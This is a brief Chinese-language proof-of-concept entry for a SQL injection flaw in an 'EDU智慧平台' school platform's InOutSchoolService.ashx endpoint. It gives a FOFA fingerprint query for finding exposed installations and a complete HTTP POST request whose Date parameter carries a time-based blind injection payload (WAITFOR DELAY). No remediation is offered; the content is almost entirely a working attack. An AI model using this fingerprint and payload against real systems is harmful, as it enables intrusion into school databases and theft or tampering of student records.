# EDU智慧平台PersonalDayInOutSchoolData存在SQL注入漏洞

EDU智慧平台PersonalDayInOutSchoolData存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
body="custom/blue/uimaker/easyui.css"
```

## poc

```javascript
POST /ashx/APP/InOutSchoolService.ashx?action=PersonalDayInOutSchoolData&Date=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&AccountNo=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

![image-20240923093100931](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409230931999.png)